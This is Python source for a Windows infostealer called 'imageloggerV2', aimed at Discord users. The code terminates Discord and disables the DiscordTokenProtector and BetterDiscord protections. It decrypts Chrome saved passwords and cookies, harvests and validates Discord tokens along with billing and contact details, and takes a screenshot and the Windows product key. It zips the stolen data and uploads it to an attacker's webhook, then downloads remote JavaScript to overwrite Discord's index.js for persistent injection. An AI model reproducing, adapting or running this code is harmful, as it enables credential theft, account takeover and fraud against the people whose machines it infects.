import os
import requests
import shutil
import sqlite3
import zipfile
import json
import base64
import psutil
import winreg
import time

from threading import Thread
from PIL import ImageGrab
from win32crypt import CryptUnprotectData
from re import findall
from Crypto.Cipher import AES

class imageloggerV2:
    def __init__(self):
        self.webhook = "YOUR_WEBHOOK_URL_HERE"
        self.files = "YOUR_FILES_URL_HERE"

        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.tempfolder = os.path.join(os.getenv("temp"), "imageloggerV2")
        self.regex = [r"[\w-]{24}\.[\w-]{6}\.[\w-]{27}", r"mfa\.[\w-]{84}"]
        self.encrypted_regex = r"dQw4w9WgXcQ:[^'\"]*"

        # Create temp folder
        try:
            os.makedirs(self.tempfolder, exist_ok=True)
        except Exception:
            pass

        self.tokens = []
        self.discord_psw = []
        self.backup_codes = []
        
        # Start background threads
        Thread(target=self.screenshot, daemon=True).start()
        Thread(target=self.killDiscord, daemon=True).start()
        
        self.bypassBetterDiscord()
        self.bypassTokenProtector()
        
        # Chrome data
        chrome_path = os.path.join(self.appdata, 'Google\\Chrome\\User Data')
        local_state_path = os.path.join(chrome_path, 'Local State')
        if os.path.exists(chrome_path) and os.path.exists(local_state_path):
            self.grabPassword()
            self.grabCookies()
        
        self.grabTokens()
        self.neatifyTokens()
        
        # Clean up and send files
        self.processFiles()
        self.SendInfo()
        self.Injection()
        
        # Cleanup
        try:
            shutil.rmtree(self.tempfolder)
        except:
            pass
        
    def getheaders(self, token=None, content_type="application/json"):
        headers = {
            "Content-Type": content_type,
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
        }
        if token:
            headers["Authorization"] = token
        return headers

    def Injection(self):
        # Discord injection
        for root, dirs, files in os.walk(self.appdata):
            for name in dirs:
                if "discord_desktop_core-" in name:
                    discord_core_path = os.path.join(root, name, "discord_desktop_core")
                    index_path = os.path.join(discord_core_path, "index.js")
                    
                    try:
                        os.makedirs(os.path.join(discord_core_path, "azuoy"), exist_ok=True)
                        
                        # Get injection code
                        f = requests.get("https://raw.githubusercontent.com/Rdimo/Injection/master/Injection-clean", timeout=10).text
                        f = f.replace("%WEBHOOK_LINK%", self.webhook)
                        
                        with open(index_path, 'w', encoding="utf-8") as index_file:
                            index_file.write(f)
                    except:
                        pass
        
        # Start Discord
        discord_path = os.path.join(self.roaming, "Microsoft", "Windows", "Start Menu", "Programs", "Discord Inc")
        if os.path.exists(discord_path):
            for root, dirs, files in os.walk(discord_path):
                for name in files:
                    try:
                        os.startfile(os.path.join(root, name))
                    except:
                        pass

    def killDiscord(self):
        discord_procs = ['discord', 'discordtokenprotector', 'discordcanary', 'discorddevelopment', 'discordptb']
        for proc in psutil.process_iter(['name']):
            try:
                if any(procstr in proc.info['name'].lower() for procstr in discord_procs):
                    proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied):
                pass
        time.sleep(2)

    def bypassTokenProtector(self):
        tp_path = os.path.join(self.roaming, "DiscordTokenProtector")
        config_path = os.path.join(tp_path, "config.json")
        
        # Remove protector files
        for filename in ["DiscordTokenProtector.exe", "ProtectionPayload.dll", "secure.dat"]:
            try:
                os.remove(os.path.join(tp_path, filename))
            except:
                pass
        
        # Modify config
        if os.path.exists(config_path):
            try:
                with open(config_path, 'r') as f:
                    config = json.load(f)
                
                # Disable all protections
                config.update({
                    'auto_start': False,
                    'auto_start_discord': False,
                    'integrity': False,
                    'integrity_allowbetterdiscord': False,
                    'integrity_checkexecutable': False,
                    'integrity_checkhash': False,
                    'integrity_checkmodule': False,
                    'integrity_checkscripts': False,
                    'integrity_checkresource': False,
                    'integrity_redownloadhashes': False,
                    'iterations_iv': 364,
                    'iterations_key': 457,
                    'version': 69420
                })
                
                with open(config_path, 'w') as f:
                    json.dump(config, f, indent=2)
                    
            except:
                pass

    def bypassBetterDiscord(self):
        bd_path = os.path.join(self.roaming, "BetterDiscord", "data", "betterdiscord.asar")
        if os.path.exists(bd_path):
            try:
                with open(bd_path, "r", errors="ignore") as f:
                    content = f.read()
                
                content = content.replace("api/webhooks", "MasterAzuo")
                with open(bd_path, "w", errors="ignore") as f:
                    f.write(content)
            except:
                pass

    def getProductKey(self, path=r'SOFTWARE\Microsoft\Windows NT\CurrentVersion'):
        def strToInt(x):
            return ord(x) if isinstance(x, str) else x
        
        chars = 'BCDFGHJKMPQRTVWXY2346789'
        wkey = ''
        offset = 52
        
        try:
            regkey = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
            val, _ = winreg.QueryValueEx(regkey, 'DigitalProductId')
            productName, _ = winreg.QueryValueEx(regkey, "ProductName")
            winreg.CloseKey(regkey)
            
            key = list(val)
            for i in range(24, -1, -1):
                temp = 0
                for j in range(14, -1, -1):
                    temp *= 256
                    try:
                        temp += strToInt(key[j + offset])
                    except IndexError:
                        return [productName, ""]
                    key[j + offset] = int(temp / 24)
                    temp = int(temp % 24)
                wkey = chars[temp] + wkey
            
            wkey = '-'.join([wkey[i:i+5] for i in range(0, len(wkey), 5)])
            return [productName, wkey]
        except:
            return ["Windows", "Unknown"]

    def get_master_key(self, path):
        try:
            with open(path, "r", encoding="utf-8") as f:
                local_state = json.loads(f.read())
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except:
            return None

    def decrypt_payload(self, cipher, payload):
        return cipher.decrypt(payload)[:-16].decode()

    def generate_cipher(self, aes_key, iv):
        return AES.new(aes_key, AES.MODE_GCM, iv)

    def decrypt_password(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = self.generate_cipher(master_key, iv)
            return self.decrypt_payload(cipher, payload)
        except:
            return ""

    def grabPassword(self):
        master_key = self.get_master_key(os.path.join(self.appdata, 'Google\\Chrome\\User Data\\Local State'))
        if not master_key:
            return
            
        login_db = os.path.join(self.appdata, 'Google\\Chrome\\User Data\\default\\Login Data')
        db_copy = os.path.join(self.tempfolder, "Loginvault.db")
        
        try:
            shutil.copy2(login_db, db_copy)
            conn = sqlite3.connect(db_copy)
            cursor = conn.cursor()
            
            with open(os.path.join(self.tempfolder, "Google Passwords.txt"), "w", encoding="utf-8", errors='ignore') as f:
                f.write("Produced by $σ | https://github.com/azuoy/image-logger\n\n")
                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                for r in cursor.fetchall():
                    url, username, encrypted_password = r
                    if url:
                        password = self.decrypt_password(encrypted_password, master_key)
                        f.write(f"Domain: {url}\nUser: {username}\nPass: {password}\n\n")
                        if "discord" in url.lower() and password:
                            self.discord_psw.append(password)
            
            cursor.close()
            conn.close()
            os.remove(db_copy)
        except:
            pass

    def grabCookies(self):
        master_key = self.get_master_key(os.path.join(self.appdata, 'Google\\Chrome\\User Data\\Local State'))
        if not master_key:
            return
            
        cookies_db = os.path.join(self.appdata, 'Google\\Chrome\\User Data\\default\\Network\\cookies')
        db_copy = os.path.join(self.tempfolder, "Cookies.db")
        
        try:
            shutil.copy2(cookies_db, db_copy)
            conn = sqlite3.connect(db_copy)
            cursor = conn.cursor()
            
            with open(os.path.join(self.tempfolder, "Google Cookies.txt"), "w", encoding="utf-8", errors='ignore') as f:
                f.write("Produced by $σ | https://github.com/azuoy/image-logger\n\n")
                cursor.execute("SELECT host_key, name, encrypted_value from cookies")
                for r in cursor.fetchall():
                    host, user, encrypted_cookie = r
                    if host:
                        cookie = self.decrypt_password(encrypted_cookie, master_key)
                        f.write(f"Host: {host}\nUser: {user}\nCookie: {cookie}\n\n")
            
            cursor.close()
            conn.close()
            os.remove(db_copy)
        except:
            pass

    def grabTokens(self):
        paths = {
            'Discord': os.path.join(self.roaming, 'discord', 'Local Storage', 'leveldb'),
            'Discord Canary': os.path.join(self.roaming, 'discordcanary', 'Local Storage', 'leveldb'),
            'Discord PTB': os.path.join(self.roaming, 'discordptb', 'Local Storage', 'leveldb'),
            'Chrome': os.path.join(self.appdata, 'Google', 'Chrome', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Edge': os.path.join(self.appdata, 'Microsoft', 'Edge', 'User Data', 'Default', 'Local Storage', 'leveldb'),
            'Opera': os.path.join(self.roaming, 'Opera Software', 'Opera Stable', 'Local Storage', 'leveldb'),
            'Brave': os.path.join(self.appdata, 'BraveSoftware', 'Brave-Browser', 'User Data', 'Default', 'Local Storage', 'leveldb'),
        }
        
        for name, path in paths.items():
            if not os.path.exists(path):
                continue
                
            try:
                for file_name in os.listdir(path):
                    if not (file_name.endswith('.log') or file_name.endswith('.ldb')):
                        continue
                        
                    file_path = os.path.join(path, file_name)
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            for line in f:
                                line = line.strip()
                                if not line:
                                    continue
                                    
                                # Check for tokens
                                for regex in self.regex:
                                    for token in findall(regex, line):
                                        if self.validate_token(token):
                                            if token not in self.tokens:
                                                self.tokens.append(token)
                                                
                                # Check for encrypted Discord tokens
                                if "discord" in name.lower():
                                    for match in findall(self.encrypted_regex, line):
                                        try:
                                            encrypted_data = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                            discord_key = self.get_master_key(os.path.join(self.roaming, 'discord', 'Local State'))
                                            if discord_key:
                                                token = self.decrypt_password(encrypted_data, discord_key)
                                                if self.validate_token(token):
                                                    if token not in self.tokens:
                                                        self.tokens.append(token)
                                        except:
                                            pass
                    except:
                        pass
            except:
                pass

    def validate_token(self, token):
        try:
            r = requests.get(self.baseurl, headers=self.getheaders(token), timeout=5)
            return r.status_code == 200
        except:
            return False

    def neatifyTokens(self):
        if not self.tokens:
            return
            
        with open(os.path.join(self.tempfolder, "Discord Info.txt"), "w", encoding="utf-8", errors='ignore') as f:
            f.write("Produced by $σ | https://github.com/azuoy/image-logger\n\n")
            
            for token in self.tokens:
                try:
                    j = requests.get(self.baseurl, headers=self.getheaders(token), timeout=5).json()
                    user = f"{j.get('username')}#{j.get('discriminator')}"
                    
                    # Badges
                    badges = self.get_badges(j.get('flags', 0))
                    
                    # Billing/Nitro
                    billing = self.check_billing(token)
                    nitro = self.check_nitro(token)
                    
                    # User info
                    email = j.get("email", "No email")
                    phone = j.get("phone", "No phone")
                    
                    f.write(f"{' '*17}{user}\n{'-'*50}\n")
                    f.write(f"Token: {token}\n")
                    f.write(f"Has Billing: {billing}\n")
                    f.write(f"Nitro: {nitro}\n")
                    f.write(f"Badges: {badges}\n")
                    f.write(f"Email: {email}\n")
                    f.write(f"Phone: {phone}\n\n")
                except:
                    pass

    def get_badges(self, flags):
        badges = []
        badge_map = {
            1: "Staff",
            2: "Partner", 
            4: "Hypesquad Event",
            8: "Green BugHunter",
            64: "Hypesquad Bravery",
            128: "Hypesquad Brilliance",
            256: "Hypesquad Balance",
            512: "Early Supporter",
            16384: "Gold BugHunter",
            131072: "Verified Bot Developer"
        }
        for flag, name in badge_map.items():
            if flags & flag:
                badges.append(name)
        return ", ".join(badges) if badges else "None"

    def check_billing(self, token):
        try:
            r = requests.get(self.baseurl + "/billing/payment-sources", headers=self.getheaders(token), timeout=5)
            return len(r.json()) > 0
        except:
            return False

    def check_nitro(self, token):
        try:
            r = requests.get(self.baseurl + '/billing/subscriptions', headers=self.getheaders(token), timeout=5)
            return len(r.json()) > 0
        except:
            return False

    def processFiles(self):
        for filename in ["Google Passwords.txt", "Google Cookies.txt", "Discord Info.txt", "Discord backupCodes.txt"]:
            filepath = os.path.join(self.tempfolder, filename)
            if os.path.exists(filepath):
                try:
                    with open(filepath, "r", encoding="utf-8", errors='ignore') as f:
                        content = f.read().strip()
                    if not content:
                        with open(filepath, "w", encoding="utf-8") as f:
                            f.write("Produced by $σ | https://github.com/azuoy/image-logger\n\n")
                except:
                    pass

    def screenshot(self):
        try:
            image = ImageGrab.grab()
            image.save(os.path.join(self.tempfolder, "Screenshot.png"))
        except:
            pass

    def SendInfo(self):
        # Get system info
        wname, wkey = self.getProductKey()
        
        # Get IP info
        ip_info = {"ip": "Unknown", "city": "Unknown", "country": "Unknown", "region": "Unknown", "loc": ""}
        try:
            r = requests.get("https://ipinfo.io/json", timeout=5)
            ip_info = r.json()
        except:
            pass
            
        # Create zip
        zip_path = os.path.join(self.appdata, f'azuoy.V2-[{os.getlogin()}].zip')
        try:
            with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zipped_file:
                for root, dirs, files in os.walk(self.tempfolder):
                    for file in files:
                        file_path = os.path.join(root, file)
                        arcname = os.path.relpath(file_path, self.tempfolder)
                        zipped_file.write(file_path, arcname)
        except:
            return
            
        # List files
        files_list = os.listdir(self.tempfolder)
        self.fileCount = f"{len(files_list)} Files Found: "
        file_names = "\n".join(files_list)
        
        # Create embed
        embed = {
            "embeds": [{
                "author": {
                    "name": "ImageloggerV2",
                    "url": "https://github.com/azuoy/image-logger",
                    "icon_url": "https://64.media.tumblr.com/9ec7537198ca06a6defd9659c5017a2f/b17ff0c6bb7fc1b6-4f/s1280x1920/8f4b116e79552bb93e8457a2272d5b71371bd2e7.gifv"
                },
                "description": f'**{os.getlogin()}** $o image-logger\n\n**Device**: {os.getenv("COMPUTERNAME")}\n{wname}: {wkey}\n**IP**: {ip_info["ip"]}\n**City**: {ip_info["city"]}\n**Region**: {ip_info["region"]}\n**Country**: {ip_info["country"]}\n\n**{self.fileCount}{file_names}**',
                "color": 10070709,
                "thumbnail": {"url": "https://raw.githubusercontent.com/TanZng/TanZng/master/assets/hollor_knight3.gif"},
                "footer": {"text": "$σٴٴ#7402 - https://github.com/azuoy/image-logger"}
            }]
        }
        
        # Send to webhook
        try:
            requests.post(self.webhook, json=embed, timeout=10)
            with open(zip_path, 'rb') as f:
                requests.post(self.webhook, files={'upload_file': f}, timeout=30)
            os.remove(zip_path)
        except:
            pass

if __name__ == "__main__":
    imageloggerV2()
